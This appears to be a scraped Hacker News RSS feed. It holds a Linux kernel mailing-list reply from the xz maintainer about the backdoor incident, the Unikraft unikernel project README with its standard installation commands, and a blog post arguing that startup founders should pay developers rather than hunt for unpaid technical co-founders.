<p dir="auto"><h2 tabindex="-1" dir="auto">Donate</h2><a id="user-content-donate" aria-label="Permalink: Donate" href="#donate"></a></p>
<p dir="auto">If you like the project, please consider a small donation. Every single dollar will be used to ship new features or maintain existing ones. 100% of the work we do is open-source. <a href="https://github.com/sponsors/OneUptime">Please donate here</a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[XZ: Repo maintainer Lasse Collin responding on LKML (132 pts)]]></title>
            <link>https://lkml.org/lkml/2024/3/30/188</link>
            <guid>39903216</guid>
            <pubDate>Tue, 02 Apr 2024 07:33:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lkml.org/lkml/2024/3/30/188">https://lkml.org/lkml/2024/3/30/188</a>, See on <a href="https://news.ycombinator.com/item?id=39903216">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><p>Messages in this thread</p><ul><li><a href="https://lkml.org/lkml/2024/3/20/1004">First message in thread</a></li><li><a href="https://lkml.org/lkml/2024/3/29/1350">Jonathan Corbet</a><ul><li><a href="https://lkml.org/lkml/2024/3/29/1463">Kees Cook</a></li><li><a href="https://lkml.org/lkml/2024/3/29/1475">Andrew Morton</a><ul><li><a href="https://lkml.org/lkml/2024/3/30/201">Lasse Collin</a><ul><li><a href="https://lkml.org/lkml/2024/3/30/201">Kees Cook</a></li></ul></li></ul></li></ul></li></ul></td><td rowspan="2"><img src="https://lkml.org/images/icornerl.gif" width="32" height="32" alt="/"></td><td rowspan="2"><table><tbody><tr><td colspan="2"><!--BuySellAds Zone Code--><!--End BuySellAds Zone Code--></td></tr><tr><td><table><tbody><tr><td>Date</td><td itemprop="datePublished">Sat, 30 Mar 2024 14:48:48 +0200</td></tr><tr><td>From</td></tr><tr><td>Subject</td><td itemprop="name">Re: [tech-board] [PATCH 00/11] xz: Updates to license, filters, and compression options</td></tr></tbody></table></td><td></td></tr></tbody></table><pre itemprop="articleBody">On 2024-03-29 Andrew Morton wrote:<br>&gt; On Fri, 29 Mar 2024 14:51:41 -0600 Jonathan Corbet &lt;corbet@lwn.net&gt;<br>&gt; wrote:<br>&gt; <br>&gt; &gt; &gt; Andrew (and anyone else), please do not take this code right now.<br>&gt; &gt; &gt;<br>&gt; &gt; &gt; Until the backdooring of upstream xz[1] is fully understood, we<br>&gt; &gt; &gt; should not accept any code from Jia Tan, Lasse Collin, or any<br>&gt; &gt; &gt; other folks associated with tukaani.org. It appears the domain,<br>&gt; &gt; &gt; or at least credentials associated with Jia Tan, have been used<br>&gt; &gt; &gt; to create an obfuscated ssh server backdoor via the xz upstream<br>&gt; &gt; &gt; releases since at least 5.6.0. Without extensive analysis, we<br>&gt; &gt; &gt; should not take any associated code. It may be worth doing some<br>&gt; &gt; &gt; retrospective analysis of past contributions as well...<br>&gt; &gt; &gt;<br>&gt; &gt; &gt; Lasse, are you able to comment about what is going on here?  <br>&gt; &gt; <br>&gt; &gt; FWIW, it looks like this series has been in linux-next for a few<br>&gt; &gt; days. Maybe it needs to come out, for now at least?  <br>&gt; <br>&gt; Yes, I have removed that series.<p>Thank you. None of these patches are urgent. I'm on a holiday and only<br>happened to look at my emails and it seems to be a major mess.</p><p>My proper investigation efforts likely start in the first days of<br>April. That is, I currently know only a few facts which alone are bad<br>enough.</p><p>Info will be updated here: <a href="https://tukaani.org/xz-backdoor/">https://tukaani.org/xz-backdoor/</a></p><p>-- <br>Lasse Collin</p></pre></td><td rowspan="2"><img src="https://lkml.org/images/icornerr.gif" width="32" height="32" alt="\"></td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[KraftCloud (107 pts)]]></title>
            <link>https://github.com/unikraft/unikraft</link>
            <guid>39903056</guid>
            <pubDate>Tue, 02 Apr 2024 06:58:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/unikraft/unikraft">https://github.com/unikraft/unikraft</a>, See on <a href="https://news.ycombinator.com/item?id=39903056">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <themed-picture data-catalyst-inline="true"><picture>
    <img alt="Unikraft logo" src="https://raw.githubusercontent.com/unikraft/docs/main/static/assets/imgs/unikraft.svg" width="40%">
  </picture></themed-picture>
</div>

<p dir="auto"><a href="https://github.com/unikraft/unikraft/tree/RELEASE-0.16.3"><img src="https://camo.githubusercontent.com/3423f9507dcc04d98a9f40b934e400200ffaacd052fa8be05535d68bd98f24d7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f76657273696f6e2d76302e31362e332532302854656c6573746f292d253233454335393141" alt="" data-canonical-src="https://img.shields.io/badge/version-v0.16.3%20(Telesto)-%23EC591A"></a>
<a href="https://github.com/unikraft/unikraft/blob/staging/COPYING.md"><img src="https://camo.githubusercontent.com/68eba53e0d6a09970756f366f64b8f108bbc705a758cc60f1e2b8195c0421f27/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f6c6162656c3d6c6963656e7365266d6573736167653d4253442d3326636f6c6f723d253233333835313737" alt="" data-canonical-src="https://img.shields.io/static/v1?label=license&amp;message=BSD-3&amp;color=%23385177"></a>
<a href="https://bit.ly/UnikraftDiscord" rel="nofollow"><img src="https://camo.githubusercontent.com/b68be021e1a588a504e51299ab567c6d0948918b3828a815dee95a0888be1dfa/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3736323937363932323533313532383732352e7376673f6c6162656c3d646973636f7264266c6f676f3d646973636f7264266c6f676f436f6c6f723d66666666666626636f6c6f723d373338394438266c6162656c436f6c6f723d364137454332" alt="" data-canonical-src="https://img.shields.io/discord/762976922531528725.svg?label=discord&amp;logo=discord&amp;logoColor=ffffff&amp;color=7389D8&amp;labelColor=6A7EC2"></a>
<a href="https://github.com/unikraft/unikraft/graphs/contributors"><img src="https://camo.githubusercontent.com/c6528a31225097d6b00ab08027fb816b17722938254326cbdb0daf655cf191bc/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f756e696b726166742f756e696b72616674" alt="" data-canonical-src="https://img.shields.io/github/contributors/unikraft/unikraft"></a>
<a href="https://www.codacy.com/gh/unikraft/unikraft/dashboard" rel="nofollow"><img src="https://camo.githubusercontent.com/0d954bf21c1e744e8122712af752dd67ec353d7ffe0de199fad947ae53c4f4b5/68747470733a2f2f6170702e636f646163792e636f6d2f70726f6a6563742f62616467652f47726164652f3435346636323235316439363431336661633830323462323864663263653562" alt="" data-canonical-src="https://app.codacy.com/project/badge/Grade/454f62251d96413fac8024b28df2ce5b"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">The fast, secure and open-source <br> Unikernel Development Kit</h2><a id="user-content-the-fast-secure-and-open-source--unikernel-development-kit" aria-label="Permalink: The fast, secure and open-source  Unikernel Development Kit" href="#the-fast-secure-and-open-source--unikernel-development-kit"></a></p>
<p>
	Unikraft powers the next-generation of cloud native, containerless applications by enabling you to radically customize and build custom OS/kernels; unlocking best-in-class performance, security primitives and efficiency savings.
</p>

<p dir="auto">
	<a href="https://unikraft.org/" rel="nofollow">Homepage</a>
	·
	<a href="https://unikraft.org/docs" rel="nofollow">Documentation</a>
	·
	<a href="https://github.com/unikraft/unikraft/issues/new?assignees=&amp;labels=kind%2Fbug&amp;projects=&amp;template=bug_report.yml">Report Bug</a>
	·
	<a href="https://github.com/unikraft/unikraft/issues/new?assignees=&amp;labels=kind%2Fenhancement&amp;projects=&amp;template=project_backlog.yml">Feature Request</a>
	·
	<a href="https://unikraft.org/discord" rel="nofollow">Join Our Discord</a>
	·
	<a href="https://x.com/UnikraftSDK" rel="nofollow">X.com</a>
</p>

<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/506073ae2a5d16a353e8cbdb2944f265c0ef872f94d6d028acb1c8720aa46a0f/68747470733a2f2f756e696b726166742e6f72672f6173736574732f696d67732f6d6f6e6b65792d627573696e6573732e676966"><img src="https://camo.githubusercontent.com/506073ae2a5d16a353e8cbdb2944f265c0ef872f94d6d028acb1c8720aa46a0f/68747470733a2f2f756e696b726166742e6f72672f6173736574732f696d67732f6d6f6e6b65792d627573696e6573732e676966" width="80%" data-animated-image="" data-canonical-src="https://unikraft.org/assets/imgs/monkey-business.gif"></a>
</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Instantaneous Cold-boots</strong> ⚡</p>
<ul dir="auto">
<li>While Linux-based systems might take tens of seconds to boot, Unikraft will be up in milliseconds.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Modular Design</strong> 🧩</p>
<ul dir="auto">
<li>Unikraft boasts a modular design approach, allowing developers to include only necessary components, resulting in leaner and more efficient operating system configurations.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Optimized for Performance</strong> 🚀</p>
<ul dir="auto">
<li>Built for performance, Unikraft minimizes overheads and leverages platform-specific optimizations, ensuring applications achieve peak performance levels.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Flexible Architecture Support</strong> 💻</p>
<ul dir="auto">
<li>With support for multiple hardware architectures including x86, ARM, (and soon <a href="#">RISC-V</a>), Unikraft offers flexibility in deployment across diverse hardware platforms.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Broad Language and Application Support</strong> 📚</p>
<ul dir="auto">
<li>Unikraft offers extensive support for multiple programming languages and hardware architectures, providing developers with the flexibility to choose the tools and platforms that best suit your needs.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Cloud and Edge Compatibility</strong> ☁️</p>
<ul dir="auto">
<li>Designed for cloud and edge computing environments, Unikraft enables seamless deployment of applications across distributed computing infrastructures.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Reduced Attack Surface</strong> 🛡️</p>
<ul dir="auto">
<li>By selectively including only necessary components, Unikraft reduces the attack surface, enhancing security in deployment scenarios.  Unikraft also includes many <a href="https://unikraft.org/docs/concepts/security#unikraft-security-features" rel="nofollow">additional modern security features</a>.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Developer Friendly</strong> 🛠️</p>
<ul dir="auto">
<li>Unikraft's intuitive toolchain and user-friendly interface simplify the development process, allowing developers to focus on building innovative solutions.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Efficient Resource Utilization</strong> 🪶</p>
<ul dir="auto">
<li>Unikraft optimizes resource utilization, leading to smaller footprints (meaning higher server saturation) and improved efficiency in resource-constrained environments.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Community-Driven Development</strong> 👥</p>
<ul dir="auto">
<li>Unikraft is an open-source project driven by a vibrant community of over 100 developers, fostering collaboration and innovation from industry and academia.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<p dir="auto">Install the companion command-line client <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install on macOS, Linux, and Windows:
curl -sSfL https://get.kraftkit.sh | sh"><pre><span><span>#</span> Install on macOS, Linux, and Windows:</span>
curl -sSfL https://get.kraftkit.sh <span>|</span> sh</pre></div>
<blockquote>
<p dir="auto">See <a href="https://unikraft.org/docs/cli/install" rel="nofollow">additional installation instructions</a>.</p>
</blockquote>
<p dir="auto">Run your first ultra-lightweight unikernel virtual machine:</p>
<div data-snippet-clipboard-copy-content="kraft run unikraft.org/helloworld:latest"><pre><code>kraft run unikraft.org/helloworld:latest
</code></pre></div>
<p dir="auto">View its status and manage multiple instances:</p>

<p dir="auto">View the community image catalog in your CLI for more apps:</p>
<div data-snippet-clipboard-copy-content="kraft pkg ls --update --apps"><pre><code>kraft pkg ls --update --apps
</code></pre></div>
<p dir="auto">Or browse through one of the many <a href="https://github.com/unikraft/catalog/tree/main/examples">starter example projects</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why Unikraft?</h2><a id="user-content-why-unikraft" aria-label="Permalink: Why Unikraft?" href="#why-unikraft"></a></p>
<p dir="auto">Unikraft is a radical, yet Linux-compatible with effortless tooling, technology for running applications as highly optimized, lightweight and single-purpose virtual machines (known as unikernels).</p>
<p dir="auto">In today's computing landscape, efficiency is paramount. Unikraft addresses this need with its modular design, enabling developers to create customized, lightweight operating systems tailored to specific application requirements. By trimming excess overhead and minimizing attack surfaces, Unikraft enhances security and performance in cloud and edge computing environments.</p>
<p dir="auto">Unikraft's focus on optimization ensures that applications run smoothly, leveraging platform-specific optimizations to maximize efficiency. With support for various hardware architectures and programming languages, Unikraft offers flexibility without compromising performance. In a world where resources are precious, Unikraft provides a pragmatic solution for streamlined, high-performance computing.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto">There are two ways to get started with Unikraft:</p>
<ol dir="auto">
<li>
<p dir="auto">(<strong>Recommended</strong>) Using the companion command-line tool <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a> (covered below).</p>
</li>
<li>
<p dir="auto">Using the GNU Make-based system.  For this, see our <a href="https://unikraft.org/guides/internals" rel="nofollow">advanced usage guide</a>.</p>
</li>
</ol>
<p dir="auto"><h3 tabindex="-1" dir="auto">Toolchain Installation</h3><a id="user-content-toolchain-installation" aria-label="Permalink: Toolchain Installation" href="#toolchain-installation"></a></p>
<p dir="auto">You can install the companion command-line client <a href="https://github.com/unikraft/kraftkit"><code>kraft</code></a> by using the interactive installer:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Install on macOS, Linux, and Windows:
curl -sSfL https://get.kraftkit.sh | sh"><pre><span><span>#</span> Install on macOS, Linux, and Windows:</span>
curl -sSfL https://get.kraftkit.sh <span>|</span> sh</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">macOS</h4><a id="user-content-macos" aria-label="Permalink: macOS" href="#macos"></a></p>
<div data-snippet-clipboard-copy-content="brew install unikraft/cli/kraftkit"><pre><code>brew install unikraft/cli/kraftkit
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Debian/Fedora/RHEL/Arch/Windows</h4><a id="user-content-debianfedorarhelarchwindows" aria-label="Permalink: Debian/Fedora/RHEL/Arch/Windows" href="#debianfedorarhelarchwindows"></a></p>
<p dir="auto">Use the interactive installer or see <a href="https://unikraft.org/docs/cli/install" rel="nofollow">additional installation instructions</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Codespaces</h3><a id="user-content-codespaces" aria-label="Permalink: Codespaces" href="#codespaces"></a></p>
<p dir="auto">Try out one of the examples in GitHub Codespaces:</p>
<p dir="auto"><a href="https://codespaces.new/unikraft/catalog" rel="nofollow"><img src="https://github.com/codespaces/badge.svg" alt="Open in GitHub Codespaces"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Container Build Environment</h3><a id="user-content-container-build-environment" aria-label="Permalink: Container Build Environment" href="#container-build-environment"></a></p>
<p dir="auto">You can use the pre-built development container environment which has all
dependencies necessary for building and trying out Unikraft in emulation mode.</p>
<p dir="auto">Attach your working directory on your host as a mount path volume mapped to
<code>/workspace</code>, e.g.:</p>
<div dir="auto" data-snippet-clipboard-copy-content="docker run --platform linux/x86_64 -it --rm -v $(pwd):/workspace --entrypoint bash kraftkit.sh/base:latest"><pre>docker run --platform linux/x86_64 -it --rm -v <span><span>$(</span>pwd<span>)</span></span>:/workspace --entrypoint bash kraftkit.sh/base:latest</pre></div>
<p dir="auto">The above command will drop you into a container shell.
Type <code>exit</code> or <kbd>Ctrl</kbd>+<kbd>D</kbd> to quit.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Testing your Installation</h3><a id="user-content-testing-your-installation" aria-label="Permalink: Testing your Installation" href="#testing-your-installation"></a></p>
<p dir="auto">Running unikernels with <code>kraft</code> is designed to be simple and familiar.
To test your installation of <code>kraft</code>, you can run the following:</p>
<div data-snippet-clipboard-copy-content="kraft run unikraft.org/helloworld:latest"><pre><code>kraft run unikraft.org/helloworld:latest
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Build your first unikernel</h3><a id="user-content-build-your-first-unikernel" aria-label="Permalink: Build your first unikernel" href="#build-your-first-unikernel"></a></p>
<p dir="auto">Building unikernels is also designed to be straightforward.  Build your first
unikernel by simply placing a <code>Kraftfile</code> into your repo and pointing it to your
existing <code>Dockerfile</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="spec: v0.6

runtime: base:latest

rootfs: ./Dockerfile

cmd: [&quot;/path/to/my-server-app&quot;]"><pre><span>spec</span>: <span>v0.6</span>

<span>runtime</span>: <span>base:latest</span>

<span>rootfs</span>: <span>./Dockerfile</span>

<span>cmd</span>: <span>["/path/to/my-server-app"]</span></pre></div>
<blockquote>
<p dir="auto">Learn more about the <a href="https://unikraft.org/docs/cli/reference/kraftfile/latest" rel="nofollow">syntax of a <code>Kraftfile</code></a>.</p>
</blockquote>
<p dir="auto">Once done, invoke in the context of your working directory:</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Example Projects and Pre-built Images</h2><a id="user-content-example-projects-and-pre-built-images" aria-label="Permalink: Example Projects and Pre-built Images" href="#example-projects-and-pre-built-images"></a></p>
<p dir="auto">You can find some common project examples below:</p>
<table>
<thead>
<tr>
<th></th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/c.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/c.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-c">Simple "Hello, world!" application written in C</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/cpp.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/cpp.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-cpp">Simple "Hello, world!" application written in C++</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-white.svg#gh-dark-mode-only"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-white.svg#gh-dark-mode-only" alt=""></a><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-black.svg#gh-light-mode-only"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/rust-black.svg#gh-light-mode-only" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/helloworld-rs">Simple "Hello, world!" application written in Rust built via <code>cargo</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/js.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/js.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-node18">Simple NodeJS 18 HTTP Web Server with <code>http</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/go.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/go.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-go1.21">Simple Go 1.21 HTTP Web Server with <code>net/http</code></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-python3.10-flask3.0">Simple Flask 3.0 HTTP Web Server</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg"><img src="https://raw.githubusercontent.com/unikraft/catalog/main/.github/icons/python3.svg" alt=""></a></td>
<td><a href="https://github.com/unikraft/catalog/tree/main/examples/http-python3.10">Simple Python 3.10 HTTP Web Server with <code>http.server.HTTPServer</code></a></td>
</tr>
</tbody>
</table>
<p dir="auto">Find <a href="https://github.com/unikraft/catalog">more examples and applications in our community catalog</a>!</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Cloud Deployment</h2><a id="user-content-cloud-deployment" aria-label="Permalink: Cloud Deployment" href="#cloud-deployment"></a></p>
<p dir="auto">The creators of Unikraft have built <a href="https://kraft.cloud/" rel="nofollow">KraftCloud</a>: a next generation cloud platform powered by technology intended to work in millisecond timescales.</p>
<table>
<thead>
<tr>
<th>✅</th>
<th>Millisecond Scale-to-Zero</th>
<th>✅</th>
<th>Millisecond Autoscale</th>
<th>✅</th>
<th>Millisecond Cold Boots</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅</td>
<td>Higher Throughput</td>
<td>✅</td>
<td>Much Lower Cloud Bill</td>
<td>✅</td>
<td>HW-Level Isolation</td>
</tr>
<tr>
<td>✅</td>
<td>On-Prem or Cloud-Prem</td>
<td>✅</td>
<td>Works with Docker &amp; K8s</td>
<td>✅</td>
<td>Terraform Integration</td>
</tr>
</tbody>
</table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://console.kraft.cloud/signup" rel="nofollow">Sign-up for the beta ↗</a></h3><a id="user-content-sign-up-for-the-beta-" aria-label="Permalink: Sign-up for the beta ↗" href="#sign-up-for-the-beta-"></a></p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Unikraft is open-source and licensed under <code>BSD-3-Clause</code> and the copyright of its
authors.  If you would like to contribute:</p>
<ol dir="auto">
<li>Read the <a href="https://developercertificate.org/" rel="nofollow">Developer Certificate of Origin Version 1.1</a>.</li>
<li>Sign-off commits as described in the <a href="https://developercertificate.org/" rel="nofollow">Developer Certificate of Origin Version 1.1</a>.</li>
<li>Grant copyright as detailed in the <a href="https://unikraft.org/docs/contributing/coding-conventions#license-header" rel="nofollow">license header</a>.</li>
</ol>
<p dir="auto">This ensures that users, distributors, and other contributors can rely on all the software related to Unikraft being contributed under the terms of the License. No contributions will be accepted without following this process.</p>
<p dir="auto">Afterwards, navigate to the <a href="https://unikraft.org/docs/contributing/unikraft" rel="nofollow">contributing guide</a> to get started.
See also <a href="https://unikraft.org/docs/contributing/coding-conventions" rel="nofollow">Unikraft's coding conventions</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Additional resources</h2><a id="user-content-additional-resources" aria-label="Permalink: Additional resources" href="#additional-resources"></a></p>
<ul dir="auto">
<li><a href="http://unikraft.org/docs/getting-started" rel="nofollow">Quick-start guide</a></li>
<li><a href="https://unikraft.org/docs/concepts/" rel="nofollow">What is a unikernel?</a></li>
<li><a href="https://unikraft.org/docs/features/security/" rel="nofollow">Unikraft's inherent security benefits</a></li>
<li><a href="https://unikraft.org/docs/features/performance/" rel="nofollow">Performance of Unikraft</a></li>
<li><a href="https://unikraft.org/docs/features/posix-compatibility" rel="nofollow">POSIX-compatibility with Unikraft</a></li>
<li><a href="https://unikraft.org/docs/features/green/" rel="nofollow">Energy efficiency with Unikraft</a></li>
<li><a href="https://unikraft.org/community" rel="nofollow">Unikraft Community</a></li>
<li><a href="https://unikraft.org/docs" rel="nofollow">Unikraft Documentation</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Unikraft Open-Source Project source code and its affiliated projects source code is licensed under a <code>BSD-3-Clause</code> if not otherwise stated.
For more information, please refer to <a href="https://github.com/unikraft/unikraft/blob/staging/COPYING.md"><code>COPYING.md</code></a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Affiliation</h2><a id="user-content-affiliation" aria-label="Permalink: Affiliation" href="#affiliation"></a></p>
<p dir="auto">Unikraft is a member of the <a href="https://www.linuxfoundation.org/" rel="nofollow">Linux Foundation</a> and is a <a href="https://xenproject.org/" rel="nofollow">Xen Project</a>  Incubator Project.
The Unikraft name, logo and its mascot are trademark of <a href="https://unikraft.io/" rel="nofollow">Unikraft GmbH</a>.</p>
<br>

</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You won't find a technical co-founder (313 pts)]]></title>
            <link>https://www.breakneck.dev/blog/no-tech-cofounder</link>
            <guid>39902372</guid>
            <pubDate>Tue, 02 Apr 2024 04:24:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.breakneck.dev/blog/no-tech-cofounder">https://www.breakneck.dev/blog/no-tech-cofounder</a>, See on <a href="https://news.ycombinator.com/item?id=39902372">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>You probably will not find a technical co-founder online by using one of the many co-founder matching tools.<br>
<!-- -->You may also not want to.</p>
<p>I've tried working in the normal "co-founder for equity" set ups.  I've been working as a freelancer and contractor for years.<br>
<!-- -->At the moment I am focusing my efforts on building MVPs. After talking to founders on both sides of the "equity-hire" spectrum I have some thoughts.</p>
<p>This is exclusively from the perspective of searching out a person you <strong>don't know</strong> online, for the <strong>sole purpose</strong> of <strong>founding a company</strong>.<br>
<!-- -->This is not talking about starting a business with you friend joey from work, who you've been working with for 3 years.</p>
<h2 id="requirements-for-a-tech-co-founder"><a aria-label="Link to section" href="#requirements-for-a-tech-co-founder"><span></span></a>Requirements for a tech co-founder</h2>
<p>One of the biggest reasons you will absolutely not find anyone is the high standards non technical founders expect.<br>
<!-- -->You are looking for someone who</p>
<ul>
<li>has a high level of IC (Individual Contributor) abilities.<br>
<em>Backend, frontend, hosting, AI, probably design too.</em></li>
<li>has a high level of leadership abilities.<br>
<em>Your idea is definitely gonna pop off, so you don't just need a code monkey, but someone able to lead and inspire 5-20 developer teams.</em></li>
<li>Shares your vision / is passionate about the domain.<br>
<em>The tech co-founder just really has be into gardening. And development. And AI. And Leadership. And entrepreneurship. And construction site safety. And social media for dogs.</em></li>
<li>is available within 0-2 months.</li>
<li>works completely for free.</li>
<li>Same vibe, same age range.<br>
<em>Co-founding is a marriage right? You also have to hit it off personally. After 2 meetings.</em></li>
<li>Commitment to YOUR idea for at least a couple of months.<br>
<em>Probably years. After 2 meetings.</em></li>
</ul>
<p>This is a absolutely ridiculous list of requirements. That person does not exist. If they do, why would they work with you?<br>
<!-- -->People like that have alternatives. People like that aren't immediately available. People like that do not gamble 3 months of their professional life on you after 2 meetings.<br>
<!-- -->You're not gonna entice anyone with even a fraction of those abilities with a "potential EXIST stipend" with a banging 2.000€ a month, before taxes.</p>
<p>The "instant availability" and the "for free" part are crazy multipliers.<br>
<!-- -->There are a good amount of people with high IC abilities and good enough leadership abilities, but they got jobs and aren't just waiting for you.</p>
<h2 id="opportunity-cost"><a aria-label="Link to section" href="#opportunity-cost"><span></span></a>Opportunity cost</h2>
<p>Surprisingly I see a lot of founders who want to run the business side of things not think about this at all.</p>
<p>Let's say getting your MVP developed costs 10.000€. That's a lot of money, so you're looking for a technical co-founder.<br>
<!-- -->You will give him x% of your company and in turn he starts building it for 2 months.</p>
<div><p>The technical co-founder just paid 10.000€. In opportunity cost.<br>
<em>Assuming he could instead stay at his job making 5.000€ a month.</em></p></div>
<p>That is a strange arrangement, if you think about it. It's your idea. You're the business person.<br>
<!-- -->Why are you okay with someone else risking 10.000€ on your project, but not yourself?</p>
<p>You're the one with the vision, right? You're the one with the passion, right?</p>
<h2 id="risk"><a aria-label="Link to section" href="#risk"><span></span></a>Risk</h2>
<p>Similar to the concept of opportunity cost, I see a lot of business type founders extremely risk averse.</p>
<p>When discussing potential MVP development with clients, founders answers to "equity vs hiring" will boil down to "well.. it could not turn out well and them I'm out 10.000€".<br>
<!-- -->They will rarely come out and say it, but it is what permeates all their thinking.</p>
<p>Yes. Yes it could not work out. Welcome to business, welcome to starting a business.</p>
<p>There are risks, don't push them all on your TECHNICAL co-founder.<br>
<!-- -->You should be the one aware these risks, these hidden costs and probably take on at least 50%.</p>
<h2 id="your-level-as-the-business-person"><a aria-label="Link to section" href="#your-level-as-the-business-person"><span></span></a>Your level as the business person</h2>
<p>Non technical founders usually do something like product or marketing or sales or have deep domain expertise and spotted a problem in their industry.<br>
<!-- -->You're also the <strong>business and money side</strong> of the start up. Looking for someone technical at a high level as discussed in the requirements section.</p>
<p>If you're 25+, looking to start a business and do not have access to 10.000€, I question your abilities.</p>
<p>You are the money part of the business. 10.000€ is a lot of money, but if you're looking to start a company and you're taking this as serious as many of you project outwards:</p>
<div><p><strong>This</strong> should be one of the first problems that you solve.<br>
<!-- -->Not finding a technical co-founder by talking to 20 developers and seeing who you vibe with.</p></div>
<h2 id="reasons-you-might-want-to-pay-for-a-developer"><a aria-label="Link to section" href="#reasons-you-might-want-to-pay-for-a-developer"><span></span></a>Reasons you might want to pay for a developer</h2>
<h3 id="you-find-someone-way-quicker"><a aria-label="Link to section" href="#you-find-someone-way-quicker"><span></span></a>You find someone way quicker</h3>
<p>Back to opportunity cost. If you spent an additional 6 months of searching for a co-founder, that could've been 6 months of additional revenue.</p>
<h3 id="you-might-find-a-co-founder"><a aria-label="Link to section" href="#you-might-find-a-co-founder"><span></span></a>You might find a co-founder</h3>
<p>Who ticks a lot of the boxes in the requirements section.<br>
<!-- -->You pay someone, you work with them, you see how you work together. If it works out, nothing stops you from coming up with a different arrangement. You now have a lot more information to make that decision with.</p>
